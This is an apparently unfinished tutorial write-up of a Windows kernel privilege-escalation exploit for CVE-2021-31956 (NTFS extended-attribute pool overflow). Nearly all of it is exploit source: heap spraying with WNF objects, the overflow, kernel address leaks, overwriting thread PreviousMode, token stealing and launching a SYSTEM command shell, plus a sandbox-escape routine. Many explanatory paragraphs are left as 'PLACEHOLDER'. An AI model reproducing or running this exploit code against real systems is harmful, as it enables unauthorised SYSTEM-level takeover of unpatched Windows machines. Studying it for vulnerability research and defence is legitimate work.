### The overflow_chunk Function

Before discussing the specifics of the `overflow_chunk` function, let's first review how exactly the vulnerability can be reached from user-mode. According to the previously-covered advisory, this can be achieved through a `ntoskrnl.exe` *system call* (syscall). Therefore, we want to find any syscalls related to extended attributes (`Ea`). After looking through the [Windows x64 syscall table](https://hfiref0x.github.io/NT10_syscalls.html) provided by [hfiref0x](https://hfiref0x.github.io/), we find the following two entries: 

![](img/2024-03-06-22-51-09.png)

![](img/2024-03-06-22-51-29.png)

Because the advisory mentioned the vulnerable function is called `NtfsQueryEaUserEaList`, we can make an educated guess and assume that the `NtQueryEaFile` syscall will eventually reach `NtfsQueryEaUserEaList`. The same logic is applied to the `NtSetEaFile` syscall.

Thus, we will see the `overflow_chunk` using the `NtSetEaFile` syscall to create the conditions needed so that the syscall `NtQueryEaFile` can trigger the vulnerability. Now that we know the syscalls needed to invoke the vulnerability, let's examine it's usage within the `overflow_chunk` function starting with the function definition: 

```cpp
NTSTATUS overflow_chunk(_In_ USHORT overflow_chunk_sz, _In_ char *overflow_data, _In_ USHORT overflow_data_sz)
```

Before discussing the function definition for `overflow_chunk`, let's examine the values used when `overflow_chunk` is called in `main`: 

```cpp
//CVE-2021-31956.h
#define OVERFLOW_DATA "\x00\x50\x00\x00\x00\x50\x00\x00\x00\x50\x00\x00\x00\x50\x00\x00\x00\x50\x00\x00\x00\x50\x00\x00"
#define OVERFLOW_SZ 0x18
```

The `overflow_chunk` function takes in three parameters: 

* `overflow_chunk_sz`: A read-only unsigned short used as the `EaValueLength` value.
* `overflow_data`: A read-only pointer to a character buffer containing the bytes that will overflow into the neighboring data structure. As observed with the `find_chunk` function, this data is set to a series of `0x5000` values used as a magic number. 
* `overflow_data_sz`: A read-only unsigned short that specifies the size of the `memcopy` used to overflow the buffer.

Now that we have defined how the input parameters are used by `overflow_chunk`, we will now discuss the variable definitions found in the function: 

```cpp
NTSTATUS                    status = STATUS_SUCCESS;
HANDLE                      file = INVALID_HANDLE_VALUE;
IO_STATUS_BLOCK             x = { 0 };
FILE_FULL_EA_INFORMATION    *fetched_data = zalloc(0x300);
FILE_GET_EA_INFORMATION     *vuln_selector = zalloc(0x300);
FILE_GET_EA_INFORMATION     *vuln_selector2;
FILE_FULL_EA_INFORMATION    *payload = zalloc(0x300);
FILE_FULL_EA_INFORMATION    *overflow;
```

Let's now examine each variable in-depth: 

* `status`: A variable returned after function execution of type `NTSTATUS` initialized to `STATUS_SUCCESS`.
* `file`: A handle to the file whose Extended Attributes will be exploited.

Before examining `x`, let's first review what an `IO_STATUS_BLOCK` datatype is. According to Microsoft, 

> A driver sets an IRP's I/O status block to indicate the final status of an I/O request, before calling IoCompleteRequest for the IRP.

Thus, with this in mind, `x` is first initialized to `0` from which its reference will be passed to both `NtSetEaFile` and `NtQueryEaFile`. 

Let's now examine the `fetched_data` variable. According to NTInternals, 

> `NtQueryEaFile` is used to read `EA` from `NTFS` file

Let's examine the type definition for `NtQueryEaFile`'s function prototype Y3A used in `CVE-2021-31956.h`: 

```cpp
typedef NTSTATUS(*NQEF)(
    HANDLE           FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID            Buffer,
    ULONG            Length,
    BOOLEAN          ReturnSingleEntry,
    PVOID            EaList,
    ULONG            EaListLength,
    PULONG           EaIndex,
    BOOLEAN          RestartScan
    );
```

With this definition in mind, let's look to see how `fetched_data` is used in `overflow_chunk`: 

```cpp
NtQueryEaFile(file, &x, fetched_data, 0xaa, FALSE, vuln_selector, 0x300, NULL, TRUE);
```

We see `fetched_data` is a pointer to `Buffer`, were according to NTInternals, `Buffer` is defined as,

> Caller's allocated buffer for output data.

However, in the context of our exploit, we will not use `fetched_data` after it is called. The focus of the exploit is to use `NtQueryEaFile` to overflow into the next data structure in memory. 

Let's now examine the variable `vuln_selector`. 

* `vuln_selector2`: PLACEHOLDER
* `payload`: PLACEHOLDER
* `overflow`: PLACEHOLDER

```cpp
file = CreateFileA("c:\\users\\username\\desktop\\placeholder.txt",
    GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL,
    CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL,
    NULL);
```

PLACEHOLDER

```cpp
if (file == INVALID_HANDLE_VALUE) {
    log_warn("overflow_chunk::_CreateFileA()1");
    goto out;
}
```

PLACEHOLDER

```cpp
if (!fetched_data || !vuln_selector || !payload) {
    log_warn("overflow_chunk::zalloc()1");
    goto out;
}
```

PLACEHOLDER

```cpp
vuln_selector->EaNameLength = (UCHAR)strlen(EANAME1);
memcpy(vuln_selector->EaName, EANAME1, vuln_selector->EaNameLength);
vuln_selector->NextEntryOffset = (ULONG)0xc;
```

PLACEHOLDER

```cpp
vuln_selector2 = (PFILE_GET_EA_INFORMATION)((UINT64)vuln_selector + (UINT64)(vuln_selector->NextEntryOffset));
vuln_selector2->EaNameLength = (UCHAR)strlen(EANAME2);
memcpy(vuln_selector2->EaName, EANAME2, vuln_selector2->EaNameLength);
vuln_selector2->NextEntryOffset = (ULONG)0x0;
```

PLACEHOLDER

```cpp
payload->Flags = (UCHAR)0x0;
payload->EaNameLength = (UCHAR)strlen(EANAME1);
payload->EaValueLength = (USHORT)0x9d;
memcpy(payload->EaName, EANAME1, payload->EaNameLength);
memset(payload->EaName + payload->EaNameLength + 0x1, 'C', payload->EaValueLength);
payload->NextEntryOffset = (ULONG)((payload->EaNameLength + payload->EaValueLength + 0x3 + 0x9) & (~0x3));
```

PLACEHOLDER

```cpp
overflow = (PFILE_FULL_EA_INFORMATION)((UINT64)payload + (UINT64)(payload->NextEntryOffset));
overflow->NextEntryOffset = (ULONG)0x0;
overflow->Flags = (UCHAR)0x0;
overflow->EaNameLength = (UCHAR)strlen(EANAME2);
overflow->EaValueLength = (USHORT)overflow_chunk_sz;
memcpy(overflow->EaName, EANAME2, overflow->EaNameLength);
memcpy(overflow->EaName + overflow->EaNameLength + 0x1, overflow_data, overflow_data_sz); // goal: overflow the first 0x10 bytes after the next pool header, so 0x20 bytes.
```

PLACEHOLDER

```cpp
status = _NtSetEaFile(file, &x, payload, 0x300);
if (!NT_SUCCESS(status)) {
    log_warn("overflow_chunk::_NtSetEaFile()1");
    goto out;
}
```

PLACEHOLDER

```cpp
status = _NtQueryEaFile(file, &x, fetched_data, 0xaa, FALSE, vuln_selector, 0x300, NULL, TRUE);
if (!NT_SUCCESS(status)) {
    log_warn("overflow_chunk::_NtQueryEaFile()1");
    goto out;
}
```

PLACEHOLDER

```cpp
puts("[+] Overflowed into neighbouring chunk");

out:
if (file && file != INVALID_HANDLE_VALUE)
    CloseHandle(file);

if (fetched_data)
    free(fetched_data);

if (vuln_selector)
    free(vuln_selector);

if (payload)
    free(payload);

return status;
```

PLACEHOLDER

### The fragment_heap Function

```cpp
NTSTATUS fragment_heap(_Inout_ PWNF_STATE_NAME statenames, _In_ UINT64 count)
```

PLACEHOLDER

```cpp
NTSTATUS    status = STATUS_SUCCESS;
UINT64      counter = 0;
```

PLACEHOLDER

```cpp
for (int i = 0; i < count; i += 3) {
    // create holes
    status = _NtDeleteWnfStateData(&(statenames[i]), NULL);
    if (!NT_SUCCESS(status)) {
        log_warn("fragment_heap::_NtDeleteWnfStateData()1");
        goto out;
    }

    status = _NtDeleteWnfStateName(&(statenames[i]));
    if (!NT_SUCCESS(status)) {
        log_warn("fragment_heap::_NtDeleteWnfStateData()1");
        goto out;
    }

    statenames[i].Data[0] = 0;
    statenames[i].Data[1] = 0;
    
    counter++;
}
```

PLACEHOLDER

```cpp
printf("[+] Created 0x%llx holes of 0xc0 size in the heap\n", counter * 2);

out:
    return status;
```

PLACEHOLDER

### The spray_heap Function


ADD_LOW_INTEGRITY




```cpp
NTSTATUS spray_heap(_Out_ PWNF_STATE_NAME statenames, _In_ UINT64 count, _In_ char *buf, _In_ UINT64 buf_sz)
{
    NTSTATUS                status = STATUS_SUCCESS;
    SECURITY_DESCRIPTOR     *sd = (SECURITY_DESCRIPTOR *)zalloc(sizeof(SECURITY_DESCRIPTOR));

    if (!sd) {
        log_warn("spray_heap::zalloc()1");
        status = STATUS_NO_MEMORY;
        goto out;
    }

    sd->Revision = 0x1;
    sd->Sbz1 = 0;
    sd->Control = 0x800c;
    sd->Owner = 0;
    sd->Group = (PSID)0;
    sd->Sacl = (PACL)0;
    sd->Dacl = (PACL)0;

    for (int i = 0; i < count; i++) {
        status = _NtCreateWnfStateName(&(statenames[i]), WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, sd);
        if (!NT_SUCCESS(status)) {
            log_warn("spray_heap::_NtCreateWnfStateName()1");
            goto out;
        }

        status = _NtUpdateWnfStateData(&(statenames[i]), buf, buf_sz, 0, 0, 0, 0); // spray 0xc0 sized kernel chunks
        if (!NT_SUCCESS(status)) {
            log_warn("spray_heap::_NtUpdateWnfStateName()1");
            goto out;
        }
    }

    printf("[+] Sprayed 0x%llx chunks of 0xc0 sized WNF structures\n", count * 2);

out:
    if (sd)
        free(sd);

    return status;
}
```

### The get_eproc Function

```cpp
NTSTATUS get_eproc(_Out_ PULONG_PTR eproc)
{
    NTSTATUS                   status = STATUS_UNSUCCESSFUL;
    PSYSTEM_HANDLE_INFORMATION handle_info = NULL;
    UINT64                     handle_info_sz = 0x10000;
    HANDLE                     current_proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, GetCurrentProcessId());

    printf("[+] Finding _EPROCESS address of current process: %ld\n", GetCurrentProcessId());

    handle_info = (PSYSTEM_HANDLE_INFORMATION)zalloc(handle_info_sz);
    if (!handle_info) {
        log_warn("get_eproc::zalloc()1");
        status = STATUS_NO_MEMORY;
        goto out;
    }

    while ((status = _NtQuerySystemInformation(
        SystemHandleInformation,
        handle_info,
        handle_info_sz,
        NULL)) == STATUS_INFO_LENGTH_MISMATCH) {

        handle_info = realloc(handle_info, handle_info_sz *= 2);
        if (!handle_info) {
            log_warn("get_eproc::realloc()1");
            status = STATUS_NO_MEMORY;
            goto out;
        }
    }

    if (!NT_SUCCESS(status)) {
        log_warn("get_eproc::NtQuerySystemInformation()1");
        goto out;
    }

    printf("[+] Fetched %ld handles\n", handle_info->NumberOfHandles);

    for (int i = 0; i < handle_info->NumberOfHandles; i++)
        if (handle_info->Handles[i].dwProcessId == GetCurrentProcessId() && handle_info->Handles[i].wValue == current_proc) {
            status = STATUS_SUCCESS;
            printf("[+] _EPROCESS of current process: %p\n", handle_info->Handles[i].pAddress);
            *eproc = (ULONG_PTR)handle_info->Handles[i].pAddress;
            free(handle_info);
            goto out;
        }

out:
    CloseHandle(current_proc);

    return status;
}
```

### The create_cmd Function

```cpp
NTSTATUS create_cmd(void)
{
    char                    cmdl[] = "C:\\Windows\\System32\\cmd.exe";
    STARTUPINFOA            si = { 0 };
    PROCESS_INFORMATION     pi = { 0 };
    BOOL                    res;
    NTSTATUS                status = STATUS_SUCCESS;

    si.cb = sizeof(STARTUPINFOA);

    res = CreateProcessA(
        cmdl, NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE, NULL, NULL,
        &si, &pi
    );

    if (!res) {
        log_warn("create_cmd::CreateProcessA()1");
        status = STATUS_UNSUCCESSFUL;
        goto out;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

out:
    return status;
}
```

### The resolve_symbols Function

```cpp
NTSTATUS resolve_symbols(void)
{
    NTSTATUS    status = STATUS_SUCCESS;
    HMODULE     ntdll = NULL, tmp = NULL;

    puts("[+] Resolving internal functions...");

    ntdll = ((tmp = GetModuleHandleA("ntdll.dll")) ? tmp : LoadLibraryA("ntdll.dll"));
    if (ntdll == NULL) {
        log_warn("resolve_symbols::LoadLibraryA()1");
        status = STATUS_NOT_FOUND;
        goto out;
    }

    _NtQuerySystemInformation = (NQSI)GetProcAddress(ntdll, "NtQuerySystemInformation");
    _NtQueryEaFile = (NQEF)GetProcAddress(ntdll, "NtQueryEaFile");
    _NtSetEaFile = (NQSI)GetProcAddress(ntdll, "NtSetEaFile");
    _NtCreateWnfStateName = (NCWSN)GetProcAddress(ntdll, "NtCreateWnfStateName");
    _NtUpdateWnfStateData = (NUWSD)GetProcAddress(ntdll, "NtUpdateWnfStateData");
    _NtDeleteWnfStateName = (NDWSN)GetProcAddress(ntdll, "NtDeleteWnfStateName");
    _NtDeleteWnfStateData = (NDWSD)GetProcAddress(ntdll, "NtDeleteWnfStateData");
    _NtQueryWnfStateData = (NQWSD)GetProcAddress(ntdll, "NtQueryWnfStateData");
    _NtReadVirtualMemory = (NRVM)GetProcAddress(ntdll, "NtReadVirtualMemory");
    _NtWriteVirtualMemory = (NWVM)GetProcAddress(ntdll, "NtWriteVirtualMemory");

    if (!_NtQuerySystemInformation || !_NtQueryEaFile || !_NtSetEaFile ||
        !_NtCreateWnfStateName || !_NtUpdateWnfStateData || !_NtDeleteWnfStateName ||
        !_NtDeleteWnfStateData || !_NtQueryWnfStateData || !_NtReadVirtualMemory || !_NtWriteVirtualMemory) {
        log_warn("resolve_symbols::GetProcAddress()1");
        status = STATUS_NOT_FOUND;
        goto out;
    }

    puts("[+] All functions resolved");

out:
    return status;
}
```

### The main Function

```cpp
int main(void)
{
    ULONG_PTR               own_eproc = 0;
    PWNF_STATE_NAME         statenames = zalloc(SPRAY_COUNT * sizeof(WNF_STATE_NAME));
    char                    buf[0xa0] = { 0 };
    ULONG                   buf_sz = sizeof(buf);
    ULONG                   overflow_idx = 0;
    char                    *read_data = zalloc(0x5000);
    char                    *write_data = zalloc(0x5000);
    ULONG                   read_data_sz = 0x5000;
    ULONG                   write_data_sz = 0x5000;
    PWNF_NAME_INSTANCE      arbwrite_name = NULL;
    UINT64                  ext_statename = 0;
    ULONG                   fix_size = 0;
    WNF_CHANGE_STAMP        stamp = 0;
    ULONG_PTR               kthread_flink = 0;
    char                    prev_mode[3] = { 0 };
    char                    old_prev_mode[3] = "\x00\x00\x01";
    PEPROCESS               own_eproc_obj = NULL;
    ULONG_PTR               kthreads[MAX_THREAD_SEARCH] = { 0 };
    ULONG_PTR               threadlisthead = 0;
    PWNF_PROCESS_CONTEXT    ctx = NULL;
    //...
}
```


```cpp
int main(void)
{
    //...
    if (!statenames || !read_data || !write_data) {
        log_warn("main::zalloc()1");
        goto out;
    }

    if (!NT_SUCCESS(resolve_symbols()))
        goto out;

    if (!NT_SUCCESS(get_eproc(&own_eproc)))
        goto out;

    if (!NT_SUCCESS(spray_heap(statenames, SPRAY_COUNT, &buf, sizeof(buf))))
        goto out;

    if (!NT_SUCCESS(fragment_heap(statenames, SPRAY_COUNT)))
        goto out;

    if (!NT_SUCCESS(overflow_chunk(OVERFLOW_SZ, OVERFLOW_DATA, OVERFLOW_SZ)))
        goto out;

    while (!NT_SUCCESS(find_chunk(statenames, SPRAY_COUNT, &buf, &buf_sz, &overflow_idx)))
        if (!NT_SUCCESS(overflow_chunk(OVERFLOW_SZ, OVERFLOW_DATA, OVERFLOW_SZ)))
            goto out;

    buf_sz = sizeof(buf);

    if (!NT_SUCCESS(read_pool(statenames, overflow_idx, read_data, &read_data_sz)))
        goto out;

    read_data_sz = 0x5000;
    memcpy(write_data, read_data, 0x5000);

    for (int i = 0; i < 0x5000; i++)
        if ((unsigned char)read_data[i] == 0x03 && (unsigned char)read_data[i + 1] == 0x09 && (unsigned char)read_data[i + 2] == 0xa8) {
            arbwrite_name = (PWNF_NAME_INSTANCE)(&write_data[i]);
            printf("[+] Found a WNF_NAME_INSTANCE structure at offset %x to our corrupted WNF_STATE_DATA\n", i);
            fix_size = i + 0x60;
            break;
        }

    if (!arbwrite_name) {
        log_warn("No WNF_NAME_INSTANCE near our corrupted WNF_STATE_DATA, probably not exploitable");
        goto out;
    }
     
    threadlisthead = (ULONG_PTR)((ULONG_PTR)own_eproc + (ULONG_PTR)0x30);
    arbwrite_name->StateData = threadlisthead;
    
    if (!NT_SUCCESS(write_pool(statenames, overflow_idx, write_data, fix_size)))
        goto out;

    ext_statename = *(PULONGLONG)&(arbwrite_name->StateName) ^ STATENAME_CONST;

    _NtQueryWnfStateData((WNF_STATE_NAME *)&ext_statename, NULL, NULL, &stamp, write_data, &write_data_sz); // this call will fail, so we don't error check
    
    kthread_flink = (UINT64)stamp << 32 | (UINT32)write_data_sz;
    write_data_sz = 0x5000;
    memcpy(write_data, read_data, 0x5000);

    kthreads[0] = (UINT64)kthread_flink - (UINT64)0x2f8;
    if ((UINT64)kthreads[0] < 0xFFFF800000000000) {
        log_warn("Fail to find _KTHREAD in memory");
        goto out;
    }

    printf("[+] Found _KTHREAD 1 at %p\n", kthreads[0]);

    for (int i = 1; i < MAX_THREAD_SEARCH; i++) {
        arbwrite_name->StateData = kthread_flink; // find next kthread

        if (!NT_SUCCESS(write_pool(statenames, overflow_idx, write_data, fix_size)))
            goto out;

        ext_statename = *(PULONGLONG) & (arbwrite_name->StateName) ^ STATENAME_CONST;

        _NtQueryWnfStateData((WNF_STATE_NAME *)&ext_statename, NULL, NULL, &stamp, write_data, &write_data_sz); // this call will fail, so we don't error check

        kthread_flink = (UINT64)stamp << 32 | (UINT32)write_data_sz;
        if ((UINT64)kthread_flink == (UINT64)threadlisthead)
            break;

        write_data_sz = 0x5000;
        memcpy(write_data, read_data, 0x5000);

        kthreads[i] = (UINT64)kthread_flink - (UINT64)0x2f8;
        if ((UINT64)kthreads[i] < 0xFFFF800000000000) {
            log_warn("Fail to find _KTHREAD in memory");
            goto out;
        }

        printf("[+] Found _KTHREAD %d at %p\n", i+1, kthreads[i]);
    }
    
    for (int i = 0; i < MAX_THREAD_SEARCH; i++) {
        if (kthreads[i] == 0)
            break;

        arbwrite_name->StateData = (UINT64)kthreads[i] + 0x220; // kthread.Process

        if (!NT_SUCCESS(write_pool(statenames, overflow_idx, write_data, fix_size)))
            goto out;

        write_data_sz = 0x5000;
        memcpy(write_data, read_data, 0x5000);

        ext_statename = *(PULONGLONG)&(arbwrite_name->StateName) ^ STATENAME_CONST;
        if (!NT_SUCCESS(_NtUpdateWnfStateData((WNF_STATE_NAME *)&ext_statename, prev_mode, 0x3, NULL, NULL, 0, 0))) {
            log_warn("main::_NtUpdateWnfStateData()1");
            goto out;
        }

        printf("[+] Overwritten PreviousMode of _KTHREAD %d to 0\n", i+1);
    }
    

    own_eproc_obj = (PEPROCESS)own_eproc;

    if (!NT_SUCCESS(steal_token(own_eproc_obj)))
        goto out;

    ctx = read64(&(own_eproc_obj->WnfContext));

    if (!NT_SUCCESS(fix_runrefs(ctx)))
        goto out;

    for (int i = 0; i < MAX_THREAD_SEARCH; i++) {
        if (kthreads[i] == 0)
            break;

        arbwrite_name->StateData = (UINT64)kthreads[i] + 0x220; // kthread.Process

        if (!NT_SUCCESS(write_pool(statenames, overflow_idx, write_data, fix_size)))
            goto out;

        write_data_sz = 0x5000;
        memcpy(write_data, read_data, 0x5000);

        ext_statename = *(PULONGLONG) & (arbwrite_name->StateName) ^ STATENAME_CONST;
        if (!NT_SUCCESS(_NtUpdateWnfStateData((WNF_STATE_NAME *)&ext_statename, old_prev_mode, 0x3, NULL, NULL, 0, 0))) {
            log_warn("main::_NtUpdateWnfStateData()1");
            goto out;
        }

        printf("[+] Restored PreviousMode of _KTHREAD %d to 1\n", i + 1);
    }

    if (!NT_SUCCESS(write_pool(statenames, overflow_idx, read_data, fix_size)))
        goto out;

    puts("[+] Restored corrupted adjacent WNF_NAME_INSTANCE");

    if (NT_SUCCESS(create_cmd()))
        puts("[+] Enjoy system shell");

out:
    if (statenames)
        free(statenames);

    if (read_data)
        free(read_data);

    if (write_data)
        free(write_data);

    return 0;
}
```

## Escaping the Sandbox with Y3A's Proof-of-Concept

```cpp
BOOLEAN AllocateWnfObject(DWORD dwWantedSize, PWNF_STATE_NAME pStateName) {
    NTSTATUS Status;
    HANDLE gProcessToken;
    WNF_TYPE_ID TypeID = { 0 };
    PSECURITY_DESCRIPTOR SecurityDescriptor;
    ULONG RetLength = 0;
    BOOL DaclPresent, SaclPresent;
    BOOL DaclDefault, SaclDefault, OwnerDefault, GroupDefault;
    PACL pDacl, pSacl;
    PSID pOwner, pGroup;
    ACE_HEADER* AceHeader;
    ACCESS_ALLOWED_ACE* pACE;
    PSECURITY_DESCRIPTOR GetSD;
    
    Status = fNtOpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &gProcessToken);
    if (Status < 0) {
        return FALSE;
    }
    
    SecurityDescriptor = (PSECURITY_DESCRIPTOR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000); // initialize a new SD

    GetSD = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);

    Status = fNtQuerySecurityObject(
        gProcessToken,
        OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION | LABEL_SECURITY_INFORMATION,
        GetSD,
        0x1000,
        &RetLength); // Query a accessible SD from process token

    if (Status < 0)
    {
        return FALSE;
    }

    // Get Owner/Group/DACL/SACL from accessible security object
    GetSecurityDescriptorOwner(GetSD, &pOwner, &OwnerDefault);
    GetSecurityDescriptorGroup(GetSD, &pGroup, &GroupDefault);
    GetSecurityDescriptorDacl(GetSD, &DaclPresent, &pDacl, &DaclDefault);
    GetSecurityDescriptorSacl(GetSD, &SaclPresent, &pSacl, &SaclDefault);

    AceHeader = (ACE_HEADER*)&pDacl[1];
    while ((DWORD)AceHeader < (DWORD)pDacl + (DWORD)pDacl->AclSize)
    {
        if (AceHeader->AceType == ACCESS_ALLOWED_ACE_TYPE)
        {
            pACE = (ACCESS_ALLOWED_ACE*)&AceHeader[0];
            pACE->Mask = GENERIC_ALL;
        }
        AceHeader = (ACE_HEADER*)((DWORD)AceHeader + (DWORD)AceHeader->AceSize);
    }

   // Set it to new SD
    InitializeSecurityDescriptor(SecurityDescriptor, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorOwner(SecurityDescriptor, pOwner, OwnerDefault);
    SetSecurityDescriptorGroup(SecurityDescriptor, pGroup, GroupDefault);
    SetSecurityDescriptorDacl(SecurityDescriptor, DaclPresent, pDacl, DaclDefault);
    SetSecurityDescriptorSacl(SecurityDescriptor, SaclPresent, pSacl, SaclDefault);

    HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, GetSD);

    Status = fNtCreateWnfStateName(
        pStateName,
        WnfTemporaryStateName,      
        WnfDataScopeSession,    
        FALSE,
        &TypeID,
        0x1000,
        SecurityDescriptor);  // invoke WNF API with new SD

    if (Status < 0)
    {
        return FALSE;
    }

    PVOID lpBuff = (PVOID)malloc(dwWantedSize - 0x20);
    memset(lpBuff, 0x00, dwWantedSize - 0x20);

    Status = fNtUpdateWnfStateData(
        pStateName,
        lpBuff,
        dwWantedSize - 0x20,
        &TypeID,
        NULL,
        0,
        0);

    if (Status < 0)
    {
        return FALSE;
    }
    free(lpBuff);
    return TRUE;
}
```
